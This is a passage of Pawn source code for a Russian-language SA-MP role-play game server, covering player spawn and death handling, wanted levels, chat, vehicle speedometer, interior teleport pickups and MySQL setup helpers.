	if(GetPVarInt(playerid, "dima_ochko_moshonki") == 1) PlayerInfo[playerid][bAdmin] = GetPVarInt(playerid, "adminka_ochka");
	if(PlayerInfo[playerid][pLogin] != false) SaveAccounts(playerid);
	
	ResetPlayerWeaponsAC(playerid);
	PlayerInfo[playerid][pLogin] = false;
	KillTimer(player_second_timer[playerid]);
	return ClearAccount(playerid);
}

public OnPlayerSpawn(playerid)
{
	if(!PlayerInfo[playerid][pLogin]) return SCM(playerid, red, "Необходимо авторизоваться!"), NewKick(playerid);
	if(!IsPlayerConnected(playerid)) return 1;
    DeletePVar(playerid,"K_Times");
    KillTimer(STimer[playerid]);
    
    
	SetPlayerScore(playerid, PlayerInfo[playerid][pLVL]);
	TogglePlayerControllable(playerid,false);
	SetTimerEx("LoadObjects",2000,false,"i",playerid);
	
	player_in_business[playerid] = -1;
	player_in_toilet[playerid] = -1;
	
	if(PlayerInfo[playerid][pHOSPITAL] != 1)
	{
		for(new i = 0; i < 13; i++)
		{
			if(!PlayerInfo[playerid][pGun][i] || !PlayerInfo[playerid][pAmmo][i]) continue;
			ResetPlayerWeapons(playerid);
			GivePlayerWeapon(playerid, PlayerInfo[playerid][pGun][i], PlayerInfo[playerid][pAmmo][i]);
		}
	}
	else
	{
		for(new i = 0; i < 13; i++)
		{
			PlayerInfo[playerid][pGun][i] = 0;
			PlayerInfo[playerid][pAmmo][i] = 0;
			SaveAccounts(playerid);
		}
	}
	PreloadAllAnimLibs(playerid);
	if(PlayerInfo[playerid][pBackPack] == 1) SetPlayerAttachedObject(playerid, 1, 3026, 1, -0.176000, -0.066000, 0.0000,0.0000, 0.0000, 0.0000, 1.07600, 1.079999, 1.029000);
	SetPlayerDefaultVariables(playerid);
	if(PlayerInfo[playerid][pPaintBall] == true)
	{
		GivePaintBallWeapon(playerid);
        new index = random(6);
        SetPlayerPos(playerid, PaintCoord[index][paintX], PaintCoord[index][paintY], PaintCoord[index][paintZ]);
        SetPlayerFacingAngle(playerid, PaintCoord[index][paintA]);
        SetCameraBehindPlayer(playerid);
        SetPlayerHealth(playerid, 100.0);
        PlayerInfo[playerid][pHP] = 100.0;
	}
	return 1;
}

public OnPlayerDeath(playerid, killerid, reason)
{
    SetPVarInt(playerid,"K_Times",GetPVarInt(playerid,"K_Times") + 1);
    if(GetPVarInt(playerid,"K_Times") > 1) return NewKick(playerid);
    if(killerid == playerid) return ResultCheat(playerid, 7);
    
	for(new i = 0; i < 13; i++)
	{
		PlayerInfo[playerid][pGun][i] = 0;
		PlayerInfo[playerid][pAmmo][i] = 0;
		SaveAccounts(playerid);
	}
	new string[256];
	if(reason < 60 && killerid != INVALID_PLAYER_ID)
	{
	    format(string, sizeof(string), "{%s}[K] %s[%d] убил %s %s[%d] (%s)", PlayerInfo[playerid][pLVL] <= 3 ? "F81414" : "C3C3C3", PlayerInfo[killerid][pName], killerid, PlayerInfo[playerid][pLVL] <= 3 ? "новичка" : "игрока", PlayerInfo[playerid][pName], playerid, gun_name[reason]);
		SCMA(grey, string);
	}
	
    if(killerid == INVALID_PLAYER_ID)
    {
		SCM(playerid, red, "Вы совершили самоубийство! Зачем?");
		PlayerInfo[playerid][pHOSPITAL] = 1;
		SCM(playerid, white, "Вы были сильно ранены и попали в больницу!");
		GiveMoney(playerid, -200, "Попал в больницу");
		PlayerInfo[playerid][pHP] = 5.0;
		
		format(string, sizeof(string), "[K] игрок %s[%d] совершил самоубийство", PlayerInfo[playerid][pName], playerid);
		SCMA(grey, string);
    }
    if(killerid != INVALID_PLAYER_ID)
    {
	    if(PlayerInfo[playerid][pHOSPITAL] == 1)
	    {
	        PlayerInfo[playerid][pHOSPITAL] = 0;
	        KillTimer(hospital_timer[playerid]);
	    }

		if(GO_TO_MP[playerid] > 0)
		{
		    GO_TO_MP[playerid] = 0;
		    SCM(playerid, blue, "[MP]: Вы завершили участие на мероприятии!");
		}

		if(PlayerInfo[playerid][pPaintBall] == true)
		{
		    PlayerInfo[killerid][pPaintKills]++;
		    GameTextForPlayer(killerid, "~g~+1 kill", 2000, 1);
		    ResetPlayerWeaponsAC(playerid);
		}
		else if(PlayerInfo[playerid][pWANTED] > 0 && IsAPolice(killerid))
		{
		    GiveMoney(killerid, PlayerInfo[playerid][pWANTED]*500, "Нейтрализовал преступника");
		    PlayerInfo[playerid][pKPZ] = PlayerInfo[playerid][pWANTED]*60*10;
		    
		    format(string, sizeof(string), "[Внимание] %s %s нейтрализовал преуступника %s и получил премию в размере %d рублей", GetPlayerRank(killerid), PlayerInfo[killerid][pName], PlayerInfo[playerid][pName], PlayerInfo[playerid][pWANTED]*500);
		    SCMR(TEAM_PPS, blue, string);
		    SCMR(TEAM_FSB, blue, string);
		    
  			PlayerInfo[playerid][pWANTED] = 0;
		    SetPlayerWantedLevel(playerid, 0);

		    format(string, sizeof(string), "Вы были посажены в тюрьму, так как вы были в розыске.");
		    SCM(playerid, red, string);
		}
		else
		{
			PlayerInfo[playerid][pHOSPITAL] = 1;
			SCM(playerid, white, "Вы были сильно ранены и попали в больницу!");
			GiveMoney(playerid, -200, "Попал в больницу");
			PlayerInfo[playerid][pHP] = 5.0;
		    if(!IsAPolice(killerid) && PlayerInfo[killerid][pMember] != TEAM_VDV && killerid != playerid && killerid != INVALID_PLAYER_ID)
		    {
		        GameTextForPlayer(killerid, "~r~вы совершили убийство и были объявлены в розыск", 5000, 5);
		        if(PlayerInfo[playerid][pWANTED] < 6) PlayerInfo[killerid][pWANTED]++;
		        SetPlayerWantedLevel(killerid, PlayerInfo[killerid][pWANTED]);

		        format(string, sizeof(string), "[Внимание] %s совершил убийство в отношении %s и был объявлен в розыск.", PlayerInfo[killerid][pName], PlayerInfo[playerid][pName]);
		        SCMR(TEAM_PPS, blue, string);
		        SCMR(TEAM_FSB, blue, string);
		    }
		}
	}
	
	return 1;
}

public OnVehicleSpawn(vehicleid)
{
	SetVehicleHealth(job_car[TEAM_VDV_BTR_CAR][0], 10000.0);
	SetVehicleHealth(job_car[TEAM_VDV_BTR_CAR][1], 10000.0);
	SetVehicleHealth(job_car[TEAM_VDV_TANK_CAR][0], 10000.0);
	SetVehicleHealth(job_car[TEAM_VDV_TANK_CAR][1], 10000.0);
	
	static engine, lights, alarm, doors, bonnet, boot, objective;
	GetVehicleParamsEx(vehicleid, engine, lights, alarm, doors, bonnet, boot, objective);
    if(IsAVel(vehicleid)) SetVehicleParamsEx(vehicleid, 1, lights, alarm, doors, bonnet, boot, objective);
	return 1;
}

public OnVehicleDeath(vehicleid, killerid)
{
	return 1;
}

public OnPlayerText(playerid, text[])
{
    if(!PlayerInfo[playerid][pLogin]) return 0;
	if(PlayerInfo[playerid][pMute] > 0)
	{
	    SCM(playerid, green, !"В данный момент у вас имеется блокировка чата. Время до сняти: /time");
	    SetPlayerChatBubble(playerid, "Пытается что-то сказать", red, 30.0, 5000);
		return 0;
	}
	else if(GetPVarInt(playerid, "antiflood") > gettime())
    {
        SCM(playerid, red, "Не флудите!");
        SetPVarInt(playerid, "antiflood", gettime()+1);
        return 0;
    }
    else if(strcmp(text, ")", true) == 0 || strcmp(text, "))", true) == 0)
	{
		cmd::me(playerid, "улыбается");
		SetPVarInt(playerid, "antiflood", gettime()+1);
		return 0;
	}
	else if(strcmp(text, "(", true) == 0 || strcmp(text, "((", true) == 0)
	{
		cmd::me(playerid, "грустит");
		SetPVarInt(playerid, "antiflood", gettime()+1);
		return 0;
	}
	else if(call_called[playerid] != -1)
	{
	    new string[144], i = call_called[playerid];
	    
		format(string, sizeof(string), "[Телефон] %s: %s", PlayerInfo[playerid][pName], text);
	    ProxDetector(30.0, playerid, string, 0xFFFFFFFF, 0xFFFFFFFF, 0xF5F5F5FF, 0xE6E6E6FF,0xB8B8B8FF);
	    SCM(i, yellow, string);
	}
	else if(GetPVarInt(playerid, "smi_news") == 1)
	{
	    new string[144];
	    format(string, sizeof(string), "[Радиоцентр] %s %s: %s", GetPlayerRank(playerid), PlayerInfo[playerid][pName], text);
	    SCMTA(0x66cc00AA, string);
	    SetPVarInt(playerid, "antiflood", gettime()+1);
		return 0;
	}
	else
	{
		stringer[0] = EOS;
		format(stringer, 160, "- %s (%s)", text, PlayerInfo[playerid][pName]);
		ProxDetector(30.0, playerid, stringer, 0xFFFFFFFF, 0xFFFFFFFF, 0xF5F5F5FF, 0xE6E6E6FF,0xB8B8B8FF);
		ApplyAnimation(playerid, "PED", "IDLE_chat", 4.1, 0, 1, 1, 1, 1);
		SetPlayerChatBubble(playerid, text, white, 30.0, 5000);
		SetPVarInt(playerid, "antiflood", gettime()+1);
	}
	return 0;
}

public OnPlayerCommandText(playerid, cmdtext[])
{
	return 1;
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	if( GetPVarInt(playerid, "key_anti_flood") > gettime())
	{
 		return SCM(playerid, red, "Не флудите. Иначе вы будете кикнуты.");
	}
	SetPVarInt(playerid, "key_anti_flood", gettime()+1);
	
	return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid)
{
	return 1;
}
public OnPlayerStateChange(playerid, newstate, oldstate)
{
    new newcar = GetPlayerVehicleID(playerid);
	if((newstate == 2 && oldstate == 3) || (newstate == 3 && oldstate == 2)) return ResultCheat(playerid, 5);
    if(newstate == oldstate) return ResultCheat(playerid, 5);
    if(newstate == PLAYER_STATE_SPECTATING)
	{
		if(!PlayerInfo[playerid][bAdmin] && PlayerInfo[playerid][pLogin]) return NewKick(playerid);
	}
	if(oldstate == PLAYER_STATE_DRIVER && newstate == PLAYER_STATE_ONFOOT)
	{
	    //
	}
	if(oldstate == PLAYER_STATE_DRIVER)
	{
	    if(!IsAPlane(newcar) && !IsABoat(newcar) && !IsANoSpeed(newcar))
		{
			KillTimer(STimer[playerid]);
			for(new i = 0; i < 15; i++) PlayerTextDrawHide(playerid, speed_td[playerid][i]);
		}
	}
	else if(newstate == PLAYER_STATE_DRIVER)
	{
		if(!IsAPlane(newcar) && !IsABoat(newcar) && !IsANoSpeed(newcar))
		{
		    SCM(playerid,blue,"Чтобы завести транспорт, нажмите {FFFFFF}[л.CTRL]{"cblue"} или же введите команду: {FFFFFF}/en");
		    SCM(playerid,blue,"Включить/выключить ограничитель скорости: {FFFFFF}/slimit[0-3]");
		    STimer[playerid] = SetTimerEx("UpdateSpeedometr", 200, true, "i",playerid);
		    for(new i = 0; i < 15; i++) PlayerTextDrawShow(playerid, speed_td[playerid][i]);
		}
	}
	else if(newstate == PLAYER_STATE_PASSENGER)
	{
	
	}
	return true;
}
public OnPlayerEnterCheckpoint(playerid)
{
    switch(pCheckpoint[playerid])
	{
	}
	return 1;
}

public OnPlayerLeaveCheckpoint(playerid)
{
	return 1;
}

public OnPlayerEnterRaceCheckpoint(playerid)
{
	switch(pCheckpoint[playerid])
	{
	}
	return 1;
}

public OnPlayerLeaveRaceCheckpoint(playerid)
{
	return 1;
}

public OnRconCommand(cmd[])
{
	return 1;
}

public OnPlayerRequestSpawn(playerid)
{
	return 1;
}

public OnObjectMoved(objectid)
{
	return 1;
}

public OnPlayerObjectMoved(playerid, objectid)
{
	return 1;
}

public OnPlayerPickUpPickup(playerid, pickupid)
{
	if(pickupid == MINER_PICK_ENTER)
	{
		FreezePlayer(playerid, 2000);
		SetPlayerPos(playerid, 2274.4556,1655.5308,-39.9659);
		SetPlayerFacingAngle(playerid, 269.1990);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid, 0);
	}
	if(pickupid == MINER_PICK_EXIT)
	{
		FreezePlayer(playerid, 2000);
		SetPlayerPos(playerid, 2364.8711,2017.5398,15.9900);
		SetPlayerFacingAngle(playerid, 105.3241);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid, 0);
	}
	if(pickupid == MAYOR_PICK_ENTER)
	{
	    FreezePlayer(playerid, 2000);
		SetPlayerPos(playerid, 822.0789,812.8612,-73.0085);
		SetPlayerFacingAngle(playerid, 160.2734);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid, 0);
	}
	if(pickupid == MAYOR_PICK_EXIT)
	{
	    FreezePlayer(playerid, 2000);
		SetPlayerPos(playerid, 1821.3672,2095.7380,16.1631);
		SetPlayerFacingAngle(playerid, 271.4844);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid, 0);
	}
	if(pickupid == AUTOSCHOOL_PICK_ENTER)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 139.5244,1365.9431,1002.9659);
	    SetPlayerFacingAngle(playerid, 86.5111);
	}
	if(pickupid == AUTOSCHOOL_PICK_EXIT)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 1910.1024,2227.6396,15.7139);
	    SetPlayerFacingAngle(playerid, 89.0177);
	}
	
	if(pickupid == PPS_PICK_ENTER)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 2572.8699,-2415.9548,22.3962);
	    SetPlayerFacingAngle(playerid, 88.2297);
	    SetPlayerVirtualWorld(playerid, 1);
	}
	if(pickupid == PPS_PICK_EXIT)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 1915.8530,2183.5759,15.7060);
	    SetPlayerFacingAngle(playerid, 84.5357);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	if(pickupid == PPS_PICK_GUN_ENTER)
	{
	    if(PlayerInfo[playerid][pMember] != TEAM_PPS) return 1;
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 2567.3386,-2417.3921,22.3545);
	    SetPlayerFacingAngle(playerid, 357.1678);
	    SetPlayerVirtualWorld(playerid, 1);
	}
	if(pickupid == PPS_PICK_GUN_EXIT)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 2571.7605,-2419.1357,22.3738);
	    SetPlayerFacingAngle(playerid, 356.1089);
	    SetPlayerVirtualWorld(playerid, 1);
	}
	if(pickupid == HOSPITAL_PICK_ENTER)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, -828.7585,1903.6345,702.0536);
	    SetPlayerFacingAngle(playerid, 182.0952);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	if(pickupid == HOSPITAL_PICK_EXIT)
	{
	    if(PlayerInfo[playerid][pHOSPITAL] > 0) return SCM(playerid, red, "Мы еще не готовы вас выписать из больницы!");
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 1973.9240,1603.3750,15.7700);
	    SetPlayerFacingAngle(playerid, 274.2161);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	
	if(pickupid == TONNEL_PICK_ENTER)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 1536.6477,1762.4507,-7.5522);
	    SetPlayerFacingAngle(playerid, 85.0014);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	if(pickupid == TONNEL_PICK_EXIT)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 2495.1108,1873.2598,-7.5529);
	    SetPlayerFacingAngle(playerid, 357.7409);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	
	if(pickupid == VDV_SKLAD_PICK_ENTER)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 1500.9913,1659.2581,-5.3244);
	    SetPlayerFacingAngle(playerid, 357.5832);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	if(pickupid == VDV_SKLAD_PICK_EXIT)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 1360.6533,1734.0857,3.6245);
	    SetPlayerFacingAngle(playerid, 268.9298);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	
	if(pickupid == BANK_PICK_ENTER)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 2056.8081,1903.6052,-77.2241);
	    SetPlayerFacingAngle(playerid, 172.0441);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	if(pickupid == BANK_PICK_EXIT)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 1853.8511,2039.2030,15.8850);
	    SetPlayerFacingAngle(playerid, 358.2950);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	
	if(pickupid == KAZARMA_PICK_ENTER)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 1306.5892,1504.7043,1002.3200);
	    SetPlayerFacingAngle(playerid, 85.7102);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	if(pickupid == KAZARMA_PICK_EXIT)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 1475.0928,1674.5309,15.3236);
	    SetPlayerFacingAngle(playerid, 357.4124);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	if(pickupid == VOENKOM_PICK_ENTER)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 271.6238,1716.4634,603.0137);
	    SetPlayerFacingAngle(playerid, 266.4230);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	if(pickupid == VOENKOM_PICK_EXIT)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 1918.1860,2303.1135,15.5697);
	    SetPlayerFacingAngle(playerid, 115.0684);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	if(pickupid == SMI_PICK_ENTER)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 1801.0729,2040.4354,-17.9900);
	    SetPlayerFacingAngle(playerid, 172.4627);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	if(pickupid == SMI_PICK_EXIT)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 1795.2292,2040.0001,15.8694);
	    SetPlayerFacingAngle(playerid, 357.0177);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	if(pickupid == PRIBATH_PICK_ENTER)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 658.6979,2323.5110,1504.3638);
	    SetPlayerFacingAngle(playerid, 266.7292);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	if(pickupid == PRIBATH_PICK_EXIT)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 1870.1240,1475.5403,10.2336);
	    SetPlayerFacingAngle(playerid, 350.7766);
	    SetPlayerVirtualWorld(playerid, 0);
	}
	
	if(pickupid == BATH_PICK_ENTER)
	{
	    if(GetPVarInt(playerid, "bath_buy") != 1) return SCM(playerid, red, "У вас нет абонемента в баню.");
	    
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 636.8881,2309.2146,1504.3500);
	    SetPlayerFacingAngle(playerid, 93.1975);
	    SetPlayerVirtualWorld(playerid, 0);
	    
	    if(PlayerInfo[playerid][pSex] == 1) SetPlayerSkin(playerid, 97);
	    else SetPlayerSkin(playerid, 138);
	    
	    player_in_bath[playerid] = 1;
	    DeletePVar(playerid, "bath_buy");
	}
	if(pickupid == BATH_PICK_EXIT)
	{
	    FreezePlayer(playerid, 2000);
	    SetPlayerPos(playerid, 661.2925,2324.9346,1504.3500);
	    SetPlayerFacingAngle(playerid, 179.6502);
	    SetPlayerVirtualWorld(playerid, 0);
	    
	    if(PlayerInfo[playerid][pMember] > 0) SetPlayerSkin(playerid, PlayerInfo[playerid][pFSkin]);
	    else SetPlayerSkin(playerid, PlayerInfo[playerid][pChar]);
	    
	    player_in_bath[playerid] = -1;
	}
	if(pickupid == PAINT_PICK)
	{
	    if(PaintActive[0] == false) return SCM(playerid, red, "Регистрация на пейнт-бол в данный момент закрыта.");
	    if(PlayerInfo[playerid][pInvitePaintBall] == true) return SCM(playerid, red, "Вы уже зарегестрированы на пейнт-бол.");
	    
		SCM(playerid, blue, "Вы успешно зарегестрировались. Ожидайте начала пентбола.");
		PlayerInfo[playerid][pInvitePaintBall] = true;
	}
	return 1;
}

public OnVehicleMod(playerid, vehicleid, componentid)
{
	return 1;
}

public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
	return 1;
}

public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
	return 1;
}

public OnPlayerSelectedMenuRow(playerid, row)
{
	return 1;
}

public OnPlayerExitedMenu(playerid)
{
	return 1;
}

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
	return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	if(newkeys == 4)
	{
	    new carid = GetPlayerVehicleID(playerid);
	    new engine, lights, alarm, doors, bonnet, boot, objective;
		if(!IsPlayerInAnyVehicle(playerid)) return 1;
		if(Light{carid} == false)
		{
			GetVehicleParamsEx(carid,engine,lights,alarm,doors,bonnet,boot,objective);
			SetVehicleParamsEx(carid,engine,true,alarm,doors,bonnet,boot,objective);
			Light{carid} = true;
		}
		else
		{
			GetVehicleParamsEx(carid,engine,lights,alarm,doors,bonnet,boot,objective);
			SetVehicleParamsEx(carid,engine,false,alarm,doors,bonnet,boot,objective);
			Light{carid} = false;
		}
	}
	if(newkeys == KEY_ACTION) cmd::en(playerid);
	return 1;
}

public OnRconLoginAttempt(ip[], password[], success)
{
	return 1;
}
public OnPlayerUpdate(playerid)
{
    PlayerInfo[playerid][pAFK] = 0;
    player_afk_time[playerid] = 0;

	if(GetPlayerMoney(playerid) != PlayerInfo[playerid][pCash])
	{
	    ResetPlayerMoney(playerid);
	    GivePlayerMoney(playerid, PlayerInfo[playerid][pCash]);
	}
	return 1;
}

public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid)
{
    return 1;
}

public OnPlayerStreamIn(playerid, forplayerid)
{
	return 1;
}

public OnPlayerStreamOut(playerid, forplayerid)
{
	return 1;
}

public OnVehicleStreamIn(vehicleid, forplayerid)
{
	return 1;
}

public OnVehicleStreamOut(vehicleid, forplayerid)
{
	return 1;
}
public OnPlayerClickPlayer(playerid, clickedplayerid, source)
{
	return 1;
}
public OnPlayerCommandReceived(playerid, cmdtext[])
{
	if(PlayerInfo[playerid][pLogin] == false) return SCM(playerid, red, !"Необходимо авторизоваться!");
	
 	if(GetPVarInt(playerid, "antiflood") > gettime())
    {
        SCM(playerid, red, "Не флудите!");
        return 0;
    }
	return 1;
}
public OnPlayerCommandPerformed(playerid, cmdtext[], success)
{
    SetPVarInt(playerid, "antiflood", gettime()+1);
	if(success == -1)
	{
		ShowCommandNotFound(playerid);
		return true;
	}
	return true;
}

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
	return 1;
}
public OnPlayerEnterDynamicArea(playerid, areaid)
{
	return 1;
}
public OnPlayerLeaveDynamicArea(playerid, areaid)
{
	return 1;
}
public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	switch(dialogid)
	{

	}
	return 1;
}
public OnQueryError(errorid, error[], callback[], query[], connectionHandle)
{
	printf("[ERROR MYSQL] ID %d | %s | Функция: %s | Запрос: %s |", errorid, error, callback, query);
	return true;
}
//************* | PUBLIC | *************//
publics UpdateSpeedometr(playerid)
{
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return KillTimer(STimer[playerid]);
	new marks[4], info[128];
	marks[0] = 'r';
	marks[1] = 'r';
	marks[2] = 'r';
	marks[3] = 'r';
	if(IsPlayerInAnyVehicle(playerid))
	{ // TranslateText("TRANLET"); pTD_ST
		if(GetPlayerVehicleID(playerid))
		{
			new Float:ms = (SpeedVehicle(playerid)/8.6)/600;
			if(ms > 0) vehicle[GetPlayerVehicleID(playerid)][veh_mileage] += ms;
		}

	    marks[0] = Engines{GetPlayerVehicleID(playerid)} ? 'g':'r';
	    marks[1] = Light{GetPlayerVehicleID(playerid)} ? 'g':'r';
	    marks[2] = (vehicle[GetPlayerVehicleID(playerid)][veh_lock] == true) ? 'g' : 'w';
	    marks[3] = (vehicle[GetPlayerVehicleID(playerid)][veh_limit] > 0.0) ? 'g' : 'w';

	    format(info,sizeof(info), "%d km/h", SpeedVehicle(playerid));
		PlayerTextDrawSetString(playerid,speed_td[playerid][6],info);

		format(info,sizeof(info), "~%c~lock", marks[2]);
		PlayerTextDrawSetString(playerid,speed_td[playerid][8],info);
		
		format(info,sizeof(info), "~%c~engine", marks[0]);
		PlayerTextDrawSetString(playerid,speed_td[playerid][10],info);
		
		format(info,sizeof(info), "%d KM", floatround(vehicle[GetPlayerVehicleID(playerid)][veh_mileage], floatround_round));
		PlayerTextDrawSetString(playerid,speed_td[playerid][2],info);
		
		format(info,sizeof(info), "~%c~lights", marks[1]);
		PlayerTextDrawSetString(playerid,speed_td[playerid][12],info);
		
		format(info,sizeof(info), "~%c~limit", marks[3]);
		PlayerTextDrawSetString(playerid,speed_td[playerid][14],info);

		format(info,sizeof(info), "%d L.", floatround(vehicle[GetPlayerVehicleID(playerid)][veh_fuel], floatround_round));
		PlayerTextDrawSetString(playerid,speed_td[playerid][4],info);
		
        if(vehicle[GetPlayerVehicleID(playerid)][veh_limit] > 0.0)
        {
            if(SpeedVehicle( playerid ) > vehicle[ GetPlayerVehicleID(playerid) ][veh_limit])
            {
                new Float:x, Float:y, Float:z, Float:dif = vehicle[ GetPlayerVehicleID(playerid) ][veh_limit] / SpeedVehicle(playerid);
                GetVehicleVelocity( GetPlayerVehicleID(playerid), x, y, z);
                SetVehicleVelocity( GetPlayerVehicleID(playerid), x*dif, y*dif, z*dif);
            }
        }
	}
	return 1;
}
publics CheckPassChangePass(playerid, password[])
{
	new rows, fields;
	cache_get_data(rows, fields);
	if(rows)
	{
        SPD(playerid, D_CHANGE_PASS, DIALOG_STYLE_INPUT, "{"cblue"}UNIGVA | Смена пароля", "{"cwhite"}Введите новый пароль для вашего аккаунта.\nОн будет запрашиваться при каждом входе на сервер.\n\n{"cblue"}Примечения:\n\
		- Пароль должен быть сложным (Пример: s9cQ17)\n- Пароль должен состоять из цифр и букв\n- Максимальная длина пароля от 6 до 20 символов.", "Далее", "Назад");
	}
	else
	{
		SCM(playerid, red, "Пароль не верный.");
		return SPD(playerid, D_CHECK_PASS, DIALOG_STYLE_INPUT, "{"cblue"}UNIGVA | Смена пароля", "{FFFFFF}Прежде, чем сменить пароль. Введите существующий:", "Далее", "Назад");
	}
	return 1;
}

publics LoadObjects(playerid) return TogglePlayerControllable(playerid,1);
//************* | STOCKS | *************//
stock SendDeadAdm(killerid,playerid)
{
	foreach(new i: Player)
	{
		if(PlayerInfo[i][bAdmin]) SendDeathMessage(i, killerid, playerid);
	}
	return 1;
}

stock Converts(number)
{
	new hours = 0, mins = 0, secs = 0, string[30];
	hours = floatround(number / 3600);
	mins = floatround((number / 60) - (hours * 60));
	secs = floatround(number - ((hours * 3600) + (mins * 60)));
	if(hours > 0)
	{
		format(string, 30, "%d:%02d:%02d", hours, mins, secs);
	}
	else
	{
		format(string, 30, "%d:%02d", mins, secs);
	}
	return string;
}

stock CreateMySQLConnection(host[], user[], database[], pass[])
{
	connects = mysql_connect(host, user, database, pass);
	if(mysql_errno()==0) printf("[MYSQL]: Подключение к базе успешно");
	else return printf("[MYSQL]: Подключиться к базе не удалось");
	mysql_tquery(connects, "SET CHARACTER SET 'utf8'", "", "");
	mysql_tquery(connects, "SET NAMES 'utf8'", "", "");
	mysql_tquery(connects, "SET character_set_client = 'cp1251'", "", "");
	mysql_tquery(connects, "SET character_set_connection = 'cp1251'", "", "");
	mysql_tquery(connects, "SET character_set_results = 'cp1251'", "", "");
	mysql_tquery(connects, "SET SESSION collation_connection = 'utf8_general_ci'", "", "");
	return 1;
}


stock ProxDetectorS(Float:radi, playerid, targetid)
{
	if(IsPlayerConnected(playerid) && IsPlayerConnected(targetid))
	{
		new Float:posx, Float:posy, Float:posz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		GetPlayerPos(targetid, posx, posy, posz);
		tempposx = (oldposx -posx);
		tempposy = (oldposy -posy);
		tempposz = (oldposz -posz);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi))) return 1;
	}
	return 0;
}

stock ResetPlayer(playerid)
{
	PlayerInfo[playerid][pLVL] = 0;
	PlayerInfo[playerid][pChar] = 0;
	PlayerInfo[playerid][pCash] = 0;
	PlayerInfo[playerid][pDonate] = 0;
	PlayerInfo[playerid][pMember] = 0;
	PlayerInfo[playerid][pRang] = 0;
	PlayerInfo[playerid][pWarnF] = 0;
	PlayerInfo[playerid][pVIP] = 0;
	PlayerInfo[playerid][pWarnA] = 0;
	PlayerInfo[playerid][bAdmin] = 0;
	PlayerInfo[playerid][pJob] = 0;
	PlayerInfo[playerid][pSupport] = 0;
	return 1;
}
stock IsTextInvalid(text[])
{
	if(strfind(text, "none", true) != -1) return 1; if(strfind(text, "None", true) != -1) return 1; if(strfind(text, "NONE", true) != -1) return 1; if(strfind(text, "'", true) != -1) return 1; if(strfind(text, "/", true) != -1) return 1; if(strfind(text, "%", true) != -1) return 1; if(strfind(text, ".", true) != -1) return 1;
	if(strfind(text, "%", true) != -1) return 1;
	if(strfind(text, "&", true) != -1) return 1;
	if(strfind(text, "*", true) != -1) return 1;
	if(strfind(text, "@", true) != -1) return 1;
	if(strfind(text, "(", true) != -1) return 1;
	if(strfind(text, ")", true) != -1) return 1;
	if(strfind(text, "`", true) != -1) return 1;
	if(strfind(text, ",", true) != -1) return 1;
	return 0;
}
stock ProxDetector(Float:radi, playerid, string[],col1,col2,col3,col4,col5)
{
	if(IsPlayerConnected(playerid))
	{
		new Float:posx;new Float:posy;new Float:posz;new Float:oldposx;new Float:oldposy;new Float:oldposz;new Float:tempposx;new Float:tempposy;new Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		foreach(new i: Player)
		{
			if(IsPlayerConnected(i))
			{
